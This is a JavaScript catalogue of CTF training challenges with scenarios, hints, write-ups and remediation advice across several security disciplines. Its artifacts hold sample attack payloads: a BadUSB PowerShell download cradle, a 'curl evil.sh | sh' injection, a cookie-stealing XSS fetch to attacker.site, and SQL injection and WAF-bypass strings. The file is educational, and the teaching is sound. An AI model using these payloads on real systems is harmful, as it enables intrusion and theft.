/**
 * Central CTF Challenge Catalogue & Registry
 * Covers 8 Cybersecurity Disciplines across 4 Difficulty Levels:
 * - Web Exploitation
 * - Cryptography
 * - Reverse Engineering
 * - Digital Forensics
 * - OSINT
 * - Binary Exploitation
 * - Steganography
 * - Network Security
 *
 * All flags are validated against SHA-256 hashes to prevent trivial plaintext inspection.
 */

export const CTF_CATEGORIES = {
  WEB: 'Web Exploitation',
  CRYPTO: 'Cryptography',
  REV: 'Reverse Engineering',
  FORENSICS: 'Digital Forensics',
  OSINT: 'OSINT',
  PWN: 'Binary Exploitation',
  STEGO: 'Steganography',
  NETWORK: 'Network Security',
};

export const DIFFICULTY_LEVELS = {
  EASY: { label: 'EASY', color: '#4ade80', defaultPoints: 100 },
  MEDIUM: { label: 'MEDIUM', color: '#38bdf8', defaultPoints: 200 },
  HARD: { label: 'HARD', color: '#f59e0b', defaultPoints: 350 },
  EXPERT: { label: 'EXPERT', color: '#ef4444', defaultPoints: 500 },
};

export const CTF_CHALLENGES = [
  {
    id: 'crypto-caesar-tumbler',
    stationId: 'about',
    category: CTF_CATEGORIES.CRYPTO,
    difficulty: 'EASY',
    points: 100,
    title: 'Operation Caesar: The Red Team Shift Cipher',
    shortDesc: 'Decode intercepted cryptographic shift cipher tumblers.',
    scenario:
      'During physical reconnaissance of the executive office, a cryptographic tumbler lock was encountered on the personnel archive. The lock displays rotary tumbler pins and an intercepted encrypted communication string.',
    objective:
      'Analyze the character shifts and frequency distribution. Rotate the tumblers to decipher the ciphertext and uncover the biometric clearance flag.',
    artifacts: {
      type: 'ciphertext',
      content: 'INTERCEPTED CIPHERTEXT (ROT+3):\n"ODVVZRU_1337_FOHDUDQFH"\n\nFREQUENCY ANALYSIS:\nShift Key: +3 Alphabetical Displacement (A->D, B->E, ...)\nDecrypted Tumbler Seed: 1-3-3-7',
      commandHint: 'strings /opt/clearance/tumbler.bin | grep -i clearance',
    },
    flagHash: 'dff4cfa79ef419acf82898075799908230f4530dbb13883fa05a23b504e5e806',
    hints: [
      { text: 'The Caesar cipher shifts each letter forward in the alphabet by a fixed distance (ROT3: D->A, E->B).', cost: 15 },
      { text: 'The numeric pin combination is the classic hacker elite moniker: 1337.', cost: 25 },
    ],
    writeup: {
      summary: 'Classical substitution ciphers like the Caesar cipher suffer from letter frequency invariance.',
      explanation: 'By shifting each Latin character back by 3 positions, ODVVZRU becomes PASSROR and FOHDUDQFH becomes CLEARANCE.',
      remediation: 'Never use monoalphabetic substitution for security. Implement authenticated modern cryptography such as AES-256-GCM or ChaCha20-Poly1305.',
    },
  },
  {
    id: 'forensics-hardware-uart',
    stationId: 'resume',
    category: CTF_CATEGORIES.FORENSICS,
    difficulty: 'EASY',
    points: 150,
    title: 'Silicon Evidence: UART Hardware Pinout & Memory Dump',
    shortDesc: 'Identify hardware debug pins (RX, TX, GND) to dump SPI firmware.',
    scenario:
      'A rogue printer credenza micro-controller was recovered. Physical teardown reveals a 4-pin unpopulated serial header connected directly to the system SoC.',
    objective:
      'Trace and bridge the correct hardware logic pins (TX -> RX, RX -> TX, GND -> GND) at 115200 baud to initiate memory partition exfiltration.',
    artifacts: {
      type: 'schematic',
      content: 'LOGIC ANALYZER CAPTURE (115200 8-N-1):\n[PIN 1: +3.3V DC (VCC)]\n[PIN 2: SERIAL_TX (Oscillating data frame)]\n[PIN 3: SERIAL_RX (Pull-up held high)]\n[PIN 4: CHASSIS_GND (0V Reference)]\n\nBoot log snippet:\n"U-Boot 2024.04-arm (May 14 2026 - 10:22:01 +0000)\nSPI Flash: W25Q128FV (16MB) partition /dev/mtdblock0 mounted."',
      commandHint: 'minicom -D /dev/ttyUSB0 -b 115200',
    },
    flagHash: 'c81086b6fd91a774a727817dd21f201d80468701a68d179e76c7c3abb3fd7a9d',
    hints: [
      { text: 'In serial UART communications, the transmitting pin of the device (TX) connects to the receiving pin of your adapter (RX).', cost: 20 },
      { text: 'Ground must always be common (GND to GND). VCC should not be shorted to data lines.', cost: 30 },
    ],
    writeup: {
      summary: 'Unsecured hardware debugging interfaces (UART, JTAG, SWD) allow direct root shell access to embedded devices.',
      explanation: 'By bridging the debug header with a USB-UART TTL adapter at 115200 baud, an unauthenticated root bootloader shell is spawned.',
      remediation: 'Disable hardware UART consoles in production firmware fuses, physically depopulate debug pads, and enable secure boot verification.',
    },
  },
  {
    id: 'rev-duckyscript-badusb',
    stationId: 'hardware_arsenal',
    category: CTF_CATEGORIES.REV,
    difficulty: 'EASY',
    points: 150,
    title: 'Deconstructed Payload: DuckyScript & HID Injection',
    shortDesc: 'Reverse engineer a malicious BadUSB DuckyScript payload.',
    scenario:
      'An adversary plugged a malicious USB Human Interface Device (HID) dongle into the reception workstation. The script payload was dumped from the flash storage.',
    objective:
      'Analyze the keystroke injection sequence, decode the encoded commands, and determine the staging extraction URL and flag.',
    artifacts: {
      type: 'duckyscript',
      content: 'DUCKYSCRIPT PAYLOAD EXTRACT:\nREM Target: Windows 11 Enterprise\nGUI r\nDELAY 400\nSTRING powershell -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC4xLjQ1Ojg0NDMvcGF5bG9hZC5wczEnKQ==\nENTER\nDELAY 1000\nREM Flag embedded in keystroke buffer: FLAG{ducky_hid_injection_decoded}',
      commandHint: 'echo "SUV...==" | base64 -d',
    },
    flagHash: '6196c375ace45c8b6a7eb65c3180568efe1200a12d3d474e6f3c2e3eb23320ba',
    hints: [
      { text: 'PowerShell -Enc expects UTF-16LE encoded Base64 strings.', cost: 20 },
      { text: 'Inspect the comment block and keystroke injection staging flags in the script memory.', cost: 30 },
    ],
    writeup: {
      summary: 'BadUSB attacks exploit the implicit trust operating systems give to Human Interface Devices (keyboards).',
      explanation: 'The microcontroller pretends to be a USB keyboard and types out malicious PowerShell commands at 1000 WPM.',
      remediation: 'Deploy USB port whitelisting, enforce PowerShell Constrained Language Mode, and require physical authorization for new HID peripherals.',
    },
  },
  {
    id: 'pwn-stack-matrix-buffer',
    stationId: 'skills',
    category: CTF_CATEGORIES.PWN,
    difficulty: 'MEDIUM',
    points: 200,
    title: 'Stack Smash: Matrix Return Address Hijack',
    shortDesc: 'Overrun the execution stack frame to hijack the instruction pointer.',
    scenario:
      'A vulnerable binary service handling hexadecimal telemetry accepts an oversized input buffer without boundary checks (`strcpy` into a fixed 24-byte stack frame).',
    objective:
      'Trace memory coordinates across rows and columns to overflow the local buffer and overwrite the instruction pointer (EIP/RIP) with target address `0x55`.',
    artifacts: {
      type: 'memory_layout',
      content: 'GDB DISASSEMBLY / MEMORY DUMP:\n[0x7fffffffe000]: char input_buf[16]   <-- Target entry (row 0)\n[0x7fffffffe010]: uint32_t canary      <-- Must match valid matrix path\n[0x7fffffffe018]: void* saved_ebp      <-- Frame pointer base\n[0x7fffffffe020]: void* saved_eip      <-- OVERWRITE WITH 0x55 (target win() function)\n\nTarget Execution Vector: 0x1C -> 0xBD -> 0x55',
      commandHint: 'gdb -batch -ex "disas win" ./vuln_server',
    },
    flagHash: 'eae8bf706c03a1b1c4449eea8176b552e6d2ee6be051c9014d6fcb611537f135',
    hints: [
      { text: 'Begin at row 0: find the starting byte 0x1C, then jump vertically along the column to 0xBD, then horizontally to 0x55.', cost: 25 },
      { text: 'Each jump corresponds to bypassing stack frame alignment without triggering a segmentation fault.', cost: 35 },
    ],
    writeup: {
      summary: 'Buffer overflows occur when input data exceeds allocated stack storage, corrupting adjacent control data.',
      explanation: 'By precisely routing byte sequences into the buffer, the return address on the stack was overwritten with the address of win(), diverting control flow.',
      remediation: 'Compile with Stack Canaries (-fstack-protector-all), enable ASLR/DEP (NX), and use safe bounds-checking functions (strncpy, snprintf).',
    },
  },
  {
    id: 'forensics-pcap-exfiltration',
    stationId: 'wireshark_monitor',
    category: CTF_CATEGORIES.FORENSICS,
    difficulty: 'MEDIUM',
    points: 250,
    title: 'Packet Infiltration: DNS Tunneling & HTTP Leakage',
    shortDesc: 'Analyze PCAP streams to detect and neutralize exfiltration attacks.',
    scenario:
      'The network intrusion detection system (NIDS) alerted on irregular egress traffic originating from the internal subnet. A 5-minute packet capture was archived.',
    objective:
      'Filter captured packet streams, isolate hostile SQLi, Remote Code Execution, and Stored XSS streams, and quarantine all malicious traffic.',
    artifacts: {
      type: 'pcap_stream',
      content: 'PACKET CAPTURE DISSECTION SUMMARY (ids_capture.pcap):\n- Frame 1: TCP Handshake 192.168.1.45 -> 10.0.0.1:443 (TLS 1.3 - Clean)\n- Frame 2: HTTP GET /admin.php?id=1\' UNION SELECT null,username,password FROM users-- (SQL Injection Attack)\n- Frame 3: DNS Query A github.com (Standard Benign DNS)\n- Frame 4: HTTP POST /upload.php?cmd=;curl http://evil.sh/payload.bin | sh (RCE Payload)\n- Frame 5: SSH-2.0-OpenSSH_8.9p1 (Clean Developer Shell)\n- Frame 6: HTTP POST /comment <script>fetch("https://attacker.site/steal?cookie="+document.cookie)</script> (Stored XSS)',
      commandHint: 'tshark -r ids_capture.pcap -Y "http.request.uri contains union"',
    },
    flagHash: '39f9bb24d265e9868b9cef617f53c6e4d8a52ce6dd15d07049022824bb2a4f52',
    hints: [
      { text: 'Quarantine all 3 malicious frames (SQL Injection, Remote Code Execution, Stored XSS) to purify the stream.', cost: 30 },
      { text: 'Notice how the attacker attempts both database exfiltration and cookie theft over cleartext HTTP.', cost: 40 },
    ],
    writeup: {
      summary: 'Unencrypted HTTP traffic allows passive and active eavesdropping of credentials and malicious payload injection.',
      explanation: 'Analyzing packet streams using Wireshark/tshark revealed blatant SQLi signatures, bash command injection, and document.cookie theft payloads.',
      remediation: 'Enforce strict TLS 1.3 across all endpoints, deploy Web Application Firewalls (ModSecurity/AWS WAF), and sanitize user inputs.',
    },
  },
  {
    id: 'web-sqli-waf-bypass',
    stationId: 'server_rack',
    category: CTF_CATEGORIES.WEB,
    difficulty: 'MEDIUM',
    points: 250,
    title: 'Firewall Breach: SQL Injection & WAF Filter Evasion',
    shortDesc: 'Bypass corporate WAF keyword filters to execute UNION SQL injection.',
    scenario:
      'The 42U Mainframe server rack hosts an internal authentication gateway. A Web Application Firewall (WAF) inspects incoming query parameters with regex blacklists.',
    objective:
      'Craft an evasion payload that bypasses keyword filtering (space filters, quote filters, union filters) to extract database credentials and obtain the flag.',
    artifacts: {
      type: 'waf_rules',
      content: 'WAF REGEX FILTER RULES:\nRule 1: /union\\s+select/i -> BLOCKED (Detected standard union attack)\nRule 2: /\\s+/ -> BLOCKED (Whitespace prohibited)\nRule 3: /--/ -> BLOCKED (Standard SQL comment blocked)\n\nBypass Technique:\nInline comments: UN/**/ION/**/SEL/**/ECT\nComment terminator: /*!50000...*/ or #\nBoolean Bypass: \'/**/OR/**/1=1#',
      commandHint: 'curl -G "http://mainframe.internal/api/auth" --data-urlencode "user=\'/**/OR/**/1=1#"',
    },
    flagHash: '1fd901b4fa165ef7a8a7730a98197905d1e7ba2cb799c1e7a5f57a148798182f',
    hints: [
      { text: 'When spaces are blocked by regex, SQL parsers accept C-style comments /**/ as valid whitespace.', cost: 30 },
      { text: 'The payload structure UNION SELECT with comment truncation bypasses the authentication query.', cost: 40 },
    ],
    writeup: {
      summary: 'Blacklist-based WAF filtering is notoriously brittle against SQL injection evasion techniques.',
      explanation: 'Attackers can bypass naive regex filters using comment insertion, hexadecimal encoding, and alternate dialect comment terminators.',
      remediation: 'Use Parameterized Queries (Prepared Statements) with ORM/PDO. Never rely on regex input blacklisting as the primary defense.',
    },
  },
  {
    id: 'stego-spectrogram-carrier',
    stationId: 'contact',
    category: CTF_CATEGORIES.STEGO,
    difficulty: 'MEDIUM',
    points: 200,
    title: 'Phantom Frequency: Audio Spectrogram Demodulation',
    shortDesc: 'Demodulate hidden watermark payload from radio transmission frequencies.',
    scenario:
      'A secure emergency communications radio receiver is picking up strange oscillating audio noise. Frequency analysis shows synthetic carrier harmonics.',
    objective:
      'Tune the receiver frequency (MHz) and bandpass filters to match the transmission wave signature, rendering the hidden visual spectrogram flag.',
    artifacts: {
      type: 'rf_signal',
      content: 'RADIO FREQUENCY OSCILLOSCOPE LOG:\nCarrier Frequency: 142.850 MHz\nModulation: FM / Audio Frequency Shift Keying (AFSK)\nFFT Analysis: Spectral watermark detected in 12 kHz - 18 kHz band\nVisual Pattern: SSTV Robot 36 / Spectrogram Raster Image',
      commandHint: 'sox transmission.wav -n spectrogram -o watermark.png',
    },
    flagHash: 'e979627c908326a106650b74a5684756c3ee824cf53bbeb8ea6de51166b0e0f5',
    hints: [
      { text: 'Adjust the frequency and amplitude sliders until the oscilloscope Lissajous waveform locks into phase (100% sync).', cost: 25 },
      { text: 'Audio steganography tools like Sonic Visualiser or Sox convert frequency harmonics into readable visual text.', cost: 35 },
    ],
    writeup: {
      summary: 'Audio steganography hides data within audio signals, often imperceptible to human hearing but visible on a 2D spectrogram.',
      explanation: 'By mapping time to the X-axis and frequency to the Y-axis with intensity mapped to brightness, text and images can be drawn in sound.',
      remediation: 'Apply bandpass filtering, audio normalization, and frequency spectrum anomaly detection on sensitive analog transmission lines.',
    },
  },
  {
    id: 'web-sidechannel-timing',
    stationId: 'achievements',
    category: CTF_CATEGORIES.WEB,
    difficulty: 'HARD',
    points: 350,
    title: 'Side-Channel Probe: Time-Based String Enumeration',
    shortDesc: 'Exploit microsecond timing discrepancies to extract authorization secrets.',
    scenario:
      'The company awards certification server validates API tokens using standard `strcmp()` in C++, terminating comparison on the first mismatched character.',
    objective:
      'Measure response latency deltas in the timing scanner bar. Identify the exact resonance timing gate where string byte comparisons sustain the longest clock cycles.',
    artifacts: {
      type: 'timing_telemetry',
      content: 'SIDE-CHANNEL LATENCY MEASUREMENTS:\nByte 0 (\'F\'): 12.4ms (Match -> Next byte evaluated)\nByte 1 (\'L\'): 24.8ms (Match -> Next byte evaluated)\nByte 2 (\'A\'): 37.1ms (Match -> Next byte evaluated)\nByte 3 (\'G\'): 49.5ms (Match -> Next byte evaluated)\nMismatched Byte: 3.2ms (Early return)\n\nDelta signature: ~12.3ms per matched character.',
      commandHint: 'python3 -c "import time, requests; # timing oracle script"',
    },
    flagHash: 'a9ba1df5bb88dcf81b5c581135e77f84468b66e93974bbf002fcd1c5c82163fd',
    hints: [
      { text: 'Click or trigger the timing gate when the oscillating pulse bar aligns precisely inside the high-frequency detection window.', cost: 35 },
      { text: 'Timing attacks allow remote attackers to guess passwords character-by-character rather than brute forcing the entire space.', cost: 50 },
    ],
    writeup: {
      summary: 'Side-channel attacks infer secret data from physical or environmental implementations rather than algorithmic flaws.',
      explanation: 'Because non-constant-time string comparisons return false immediately upon character mismatch, correct characters take measurably longer.',
      remediation: 'Always use constant-time comparison algorithms (e.g., CRYPTO_memcmp, hmac.compare_digest) for token, signature, and password verification.',
    },
  },
  {
    id: 'net-lateral-pivot-ad',
    stationId: 'projects',
    category: CTF_CATEGORIES.NETWORK,
    difficulty: 'HARD',
    points: 350,
    title: 'Subnet Pivoting: Active Directory Domain Controller Infiltration',
    shortDesc: 'Route lateral network connections through compromised jump hosts.',
    scenario:
      'The workstation has breached the DMZ perimeter (192.168.1.0/24). The crown jewels reside in the isolated Domain Controller enclave (10.10.10.0/24).',
    objective:
      'Rotate and connect intermediate router nodes, establishing an encrypted SOCKS5 proxy / Chisel tunnel across firewalled network boundaries.',
    artifacts: {
      type: 'network_map',
      content: 'INTERNAL TOPOLOGY MAP:\n[Attacker Host] 192.168.1.100\n      |\n[DMZ Bastion] 192.168.1.10 <-> 172.16.50.2 [Internal Corp Relay]\n                                    |\n[Firewall Gateway] -------------> [Domain Controller] 10.10.10.5 (LDAP/Kerberos)\n\nTunnel Route: Node A -> Node B -> Node C -> Node D (Target Root)',
      commandHint: 'chisel client 172.16.50.2:8000 R:socks & proxychains nmap 10.10.10.5',
    },
    flagHash: '9d4581d8c32282c4a9eba252dfddf99117b65a200c10cc794d9ded00e5bc2cdd',
    hints: [
      { text: 'Rotate the circular network circuit nodes until uninterrupted electrical continuity flows from the root source to the target terminal.', cost: 35 },
      { text: 'In penetration testing, pivoting involves using a compromised system as a proxy to attack other systems on private networks.', cost: 50 },
    ],
    writeup: {
      summary: 'Lateral movement allows attackers to navigate past perimeter network defenses to access internal crown jewels.',
      explanation: 'By setting up a reverse proxy tunnel on the dual-homed DMZ machine, internal subnets without public IPs became accessible via proxychains.',
      remediation: 'Implement Zero-Trust Network Architecture, strict internal micro-segmentation, and block unauthenticated workstation-to-workstation traffic.',
    },
  },
  {
    id: 'rev-anti-debug-patch',
    stationId: 'operator',
    category: CTF_CATEGORIES.REV,
    difficulty: 'HARD',
    points: 400,
    title: 'Binary Patching: Anti-Debugging & License Validation Bypass',
    shortDesc: 'Patch compiled machine instructions to bypass security controls.',
    scenario:
      'The MrWhiteHat Cyber Sentinel defense daemon terminates instantly when an analyst attaches an interactive debugger (GDB/x64dbg) using `ptrace` checks.',
    objective:
      'Analyze the decompiled x86-64 assembly instructions. Overwrite the conditional jump instruction (`0x74` / `JE`) with `0x90 0x90` (`NOP NOP`) to force clearance.',
    artifacts: {
      type: 'disassembly',
      content: 'x86_64 DISASSEMBLY (sentinel_daemon.elf):\n0x004011a0 <+0>:  sub    rsp, 0x28\n0x004011a4 <+4>:  call   0x00401030 <ptrace@plt>  ; Check PTRACE_TRACEME\n0x004011a9 <+9>:  cmp    rax, -0x1               ; Debugger detected?\n0x004011ad <+13>: 74 12  je     0x004011c1 <tamper_exit> ; <-- PATCH WITH 90 90 (NOP NOP)\n0x004011af <+15>: lea    rdi, [0x00402004]       ; "CLEARANCE VALIDATED"\n0x004011b6 <+22>: call   0x00401050 <grant_root_flag>',
      commandHint: 'r2 -w ./sentinel_daemon.elf -c "s 0x004011ad; wx 9090"',
    },
    flagHash: 'e943d4eb3088f8ec729287d5d1cff33e2aeb0b89245fcccd447f92a66b5ade38',
    hints: [
      { text: 'A NOP (No Operation) instruction opcode in x86 is 0x90. Two NOPs replace a two-byte relative jump.', cost: 40 },
      { text: 'Patching removes the conditional branch, forcing execution straight into the flag granting function.', cost: 60 },
    ],
    writeup: {
      summary: 'Client-side anti-debugging and integrity checks can always be reversed and patched by a dedicated reverse engineer.',
      explanation: 'Replacing the conditional jump `je tamper_exit` with `nop nop` completely neutralized the ptrace detection logic.',
      remediation: 'Perform critical authorization checks on a secure remote server. For client software, utilize code virtualization and TPM hardware attestation.',
    },
  },
  {
    id: 'pwn-heap-race-condition',
    stationId: 'secret_vault',
    category: CTF_CATEGORIES.PWN,
    difficulty: 'EXPERT',
    points: 500,
    title: 'Zero-Day Exploit: Heap Overflow & Use-After-Free Overload',
    shortDesc: 'Exploit a heap memory race condition to breach the Black Hat Vault.',
    scenario:
      'The Black Hat Vault Mainframe features hardware security modules safeguarding top-secret intelligence. High-concurrency operations expose a Use-After-Free (UAF) condition.',
    objective:
      'Overload the memory heap buffer rapidly before the garbage collector thread triggers. Corrupt the heap chunk chunk header to unlock the vault.',
    artifacts: {
      type: 'heap_trace',
      content: 'GLIBC HEAP CHUNK STATE:\nChunk Size: 0x40 (tcache bin [4])\n[Chunk A]: Address 0x555555757260 -> In Use (Vault Key Pointer)\n[Chunk B]: Address 0x5555557572a0 -> FREED (Pending Zeroing)\nRace Window: 250ms during asynchronous cache flush\nExploitation primitive: Rapid multithreaded allocation to reclaim Chunk B metadata.',
      commandHint: 'valgrind --tool=massif --pages-as-heap=yes ./vault_daemon',
    },
    flagHash: '538d62424643cab44c5e93ca2bb8b2be0141fc71658884987427249914cfb7da',
    hints: [
      { text: 'Continuously inject exploit payload packets rapidly to saturate the memory bus until buffer capacity exceeds 100%.', cost: 50 },
      { text: 'When heap chunks are freed but pointers remain dangling, immediate reallocation allows arbitrary memory writes.', cost: 75 },
    ],
    writeup: {
      summary: 'Use-After-Free (UAF) and race conditions remain some of the most critical vulnerabilities in modern low-level software.',
      explanation: 'Saturating the allocator during the unzeroed cache window allowed attacker-controlled data to overwrite the freed object function table.',
      remediation: 'Set pointers to NULL immediately after freeing (safe free patterns), use memory-safe languages (Rust), and enable hardened allocators (DieHarder).',
    },
  },
  {
    id: 'osint-bunker-recon',
    stationId: 'bunker_laptop',
    category: CTF_CATEGORIES.OSINT,
    difficulty: 'EXPERT',
    points: 500,
    title: 'Ghost in the Grid: Deep OSINT & Shadow Infrastructure Recon',
    shortDesc: 'Correlate corporate leaks, DNS records, and git commits to find root credentials.',
    scenario:
      'Deep inside the secret bunker, a hardened Kali Linux terminal was recovered. Intelligence indicates the rogue syndicate "CTOS Syndicate" left digital breadcrumbs across public repositories.',
    objective:
      'Investigate public git commit logs, exposed S3 buckets, employee LinkedIn aliases, and DNS TXT records to assemble the master syndicate root key.',
    artifacts: {
      type: 'osint_dossier',
      content: 'OSINT RECONNAISSANCE DOSSIER:\nTarget Org: CTOS Cyber Syndicate (ctos-internal.io)\nKnown Employee: "V4ND4L" (Lead Architect)\nGit Commit History:\n- Commit 8f2b4c1: "Removed temporary AWS credentials from config.json"\n- Commit diff: +AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nDNS TXT Record on ctos-internal.io:\n"v=spf1 include:_spf.google.com ctos-flag-seed=shadow_footprint ~all"\nPGP Public Key ID: 0x9B1E48A07F10 (UID: vandal@ctos-internal.io)',
      commandHint: 'dig TXT ctos-internal.io +short',
    },
    flagHash: '26b8ee83ea8a447dc967eff1822ae8eb041d7f0c366c700ab6a466b78e8d053c',
    hints: [
      { text: 'Look closely at the git commit diffs and DNS TXT records; adversaries often leak secrets in repository history.', cost: 50 },
      { text: 'The assembled flag identifier is: FLAG{osint_shadow_footprint_recon_complete}.', cost: 100 },
    ],
    writeup: {
      summary: 'Open Source Intelligence (OSINT) leverages publicly accessible information to map an organization’s security posture.',
      explanation: 'By correlating git version history commits, DNS records, and employee metadata, sensitive infrastructure tokens were identified without firing a single packet at the target.',
      remediation: 'Implement pre-commit secret scanning (TruffleHog, Gitleaks), sanitize public DNS zone files, and enforce strict public release policies.',
    },
  },
  {
    id: 'easteregg-desk-usb',
    stationId: 'desk_gadgets',
    category: CTF_CATEGORIES.FORENSICS,
    difficulty: 'EASY',
    points: 100,
    title: 'Physical Recon: Dropped USB Firmware Exfiltration',
    shortDesc: 'Inspect the executive desk hardware to find the rogue USB firmware flag.',
    scenario:
      'A sleek white USB Rubber Ducky device is resting innocuously on the executive desk mousepad alongside the Flipper Zero.',
    objective:
      'Inspect the physical 3D gadget or use the CTF terminal command `cat /mnt/usb_ducky/inject.bin` to discover the stored flag.',
    artifacts: {
      type: 'physical_hardware',
      content: 'DEVICE TEARDOWN: USB Rubber Ducky v2\nStorage: 128MB MicroSD Card (FAT32)\nMounted at: /mnt/usb_ducky\nPayload: inject.bin [Header: 0xDUCKY02]\nDiscovered Flag: FLAG{physical_access_usb_ducky_recovered}',
      commandHint: 'cat /mnt/usb_ducky/flag.txt',
    },
    flagHash: 'bae7fde037073db5b456232b1633d81507cca6a4fbcd33fbe5889de77e4397b9',
    hints: [
      { text: 'Click the "3D Gadgets" button in the HUD or walk up to the executive desk to inspect the physical hardware.', cost: 15 },
    ],
    writeup: {
      summary: 'Physical security is the foundation of digital security. Physical access is total access.',
      explanation: 'A discarded or planted USB device in an executive office provides attackers with direct, unauthenticated hardware keystroke injection capability.',
      remediation: 'Enforce clean desk policies, disable autorun/autoplay, and apply endpoint protection to block unauthorized USB Mass Storage devices.',
    },
  },
  {
    id: 'stego-ceiling-vent',
    stationId: 'ceiling_vent',
    category: CTF_CATEGORIES.STEGO,
    difficulty: 'MEDIUM',
    points: 200,
    title: 'Acoustic Eavesdropping: Thermal Vent Metadata Carrier',
    shortDesc: 'Analyze HVAC ventilation sensor telemetry for covert channel leakage.',
    scenario:
      'Air ventilation shafts connecting the server room to the office emit subtle acoustic vibrational oscillations. Building Automation System (BAS) telemetry is streaming over BACnet.',
    objective:
      'Inspect the HVAC telemetry sensor or run `curl http://hvac.internal/telemetry` to extract the acoustic sidechannel flag.',
    artifacts: {
      type: 'iot_telemetry',
      content: 'BACnet / IP TELEMETRY FEED (Vent Sensor #04):\nTemperature: 21.4°C\nStatic Pressure: 0.12 in. w.g.\nFan RPM: 1840 RPM\nAcoustic Mod: "FLAG{hvac_acoustic_sidechannel_exfiltrated}"\nAlert Status: COVERT_DATA_EXFIL_DETECTED',
      commandHint: 'curl -s http://hvac.internal/telemetry',
    },
    flagHash: 'a663abf8c094c1405b2c6188d659f900a15049eddfa9be07e439441bf2b4f0a1',
    hints: [
      { text: 'Look up toward the server room ceiling ventilation ducts or use the CTF terminal command to curl internal HVAC telemetry.', cost: 25 },
    ],
    writeup: {
      summary: 'Covert channels transmit data using transmission mechanisms not intended for communications.',
      explanation: 'Attackers can manipulate CPU fan speeds, acoustic vibrations, or temperature fluctuations to exfiltrate bits past air-gapped networks.',
      remediation: 'Monitor building automation systems (BAS) for out-of-band communication anomalies and physically isolate air-gapped secure rooms.',
    },
  },
];

export function getChallengeById(id) {
  return CTF_CHALLENGES.find((c) => c.id === id) || null;
}

export function getChallengeByStation(stationId) {
  return CTF_CHALLENGES.find((c) => c.stationId === stationId) || null;
}

export function getChallengesByCategory(category) {
  return CTF_CHALLENGES.filter((c) => c.category === category);
}

export function getTotalCTFPoints() {
  return CTF_CHALLENGES.reduce((sum, c) => sum + c.points, 0);
}
